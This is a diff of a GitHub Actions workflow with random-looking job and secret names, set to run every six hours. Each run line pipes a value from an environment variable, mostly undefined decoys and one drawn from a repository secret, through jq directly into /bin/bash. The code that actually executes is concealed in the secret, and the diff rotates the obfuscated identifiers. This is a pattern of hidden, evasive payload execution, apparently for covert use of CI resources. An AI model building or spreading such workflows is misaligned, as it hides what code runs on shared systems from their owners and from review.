@@ -1,9 +1,9 @@
 name: laimouli2197
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 1/6 * * *'
+    - cron: '53 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: laimouli2197
         env:
-          khw7623: ${{ secrets.khw7623 }}
+          ylmg93: ${{ secrets.ylmg93 }}
         run: |
-          echo $khw7623 | jq -r .jvesd437 | /bin/bash
-          echo $ez0076 | jq -r .pvex9 | /bin/bash
-          echo $wgu1 | jq -r .orzs177 | /bin/bash
-          echo $f98814 | jq -r .qnrzx44 | /bin/bash
-          echo $kdxny17 | jq -r .r66558 | /bin/bash
-          echo $w66903 | jq -r .ojgrc06 | /bin/bash
-          echo $wo5 | jq -r .gcwl08479 | /bin/bash
-          echo $t07 | jq -r .dsw58 | /bin/bash
-          echo $tgbh461 | jq -r .h227 | /bin/bash
+          echo $ylmg93 | jq -r .wmdsf941 | /bin/bash
+          echo $sy01859 | jq -r .ojk0010 | /bin/bash
+          echo $vgbgy44 | jq -r .hyzf984 | /bin/bash
+          echo $ntbwl2 | jq -r .ngqsj563 | /bin/bash
+          echo $lzvf6764 | jq -r .ezji4730 | /bin/bash
+          echo $fbnxp80 | jq -r .sdjb35145 | /bin/bash
+          echo $ejao3 | jq -r .xs69408 | /bin/bash
+          echo $ich154 | jq -r .i37 | /bin/bash
+          echo $hwx07 | jq -r .tbonj41 | /bin/bash
 
